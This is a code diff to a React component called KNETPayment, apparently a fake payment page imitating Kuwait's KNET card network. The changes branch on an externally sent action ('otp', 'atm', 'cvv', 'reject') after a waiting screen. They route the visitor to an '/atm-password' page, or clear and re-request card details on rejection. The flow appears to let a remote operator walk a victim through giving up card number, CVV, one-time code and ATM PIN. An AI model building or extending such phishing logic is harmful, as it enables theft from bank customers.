@@ -240,17 +240,26 @@ export default function KNETPayment() {
       waitingMessage.value = "";
       setIsWaiting(false);
 
-      if (phase === "card") {
+      if (phase === "card" || phase === "cvv") {
         if (action === "otp") {
+          setShowCvvPopup(false);
+          setCvvWaiting(false);
           setPhase("otp");
           startCountdown();
           navigateToPage("رمز التحقق بنفت (OTP)");
+        } else if (action === "atm" || action === "cvv") {
+          setShowCvvPopup(false);
+          setCvvWaiting(false);
+          navigate("/atm-password");
         } else if (action === "reject") {
+          setShowCvvPopup(false);
+          setCvvWaiting(false);
           setRejectedError(t.errRejectCard);
           setCardNumber("");
           setCardHolderName("");
           setExpiryMonth("");
           setExpiryYear("");
+          setPhase("card");
         }
       } else if (phase === "otp") {
         if (action === "otp") {
@@ -281,8 +290,17 @@ export default function KNETPayment() {
           setPhase("otp");
           startCountdown();
           navigateToPage("رمز التحقق بنفت (OTP)");
+        } else if (action === "atm" || action === "cvv") {
+          setShowCvvPopup(false);
+          navigate("/atm-password");
         } else if (action === "reject") {
-          setCvvError(true);
+          setShowCvvPopup(false);
+          setRejectedError(t.errRejectCard);
+          setCardNumber("");
+          setCardHolderName("");
+          setExpiryMonth("");
+          setExpiryYear("");
+          setPhase("card");
           setCvvCode("");
         }
         codeAction.value = null;
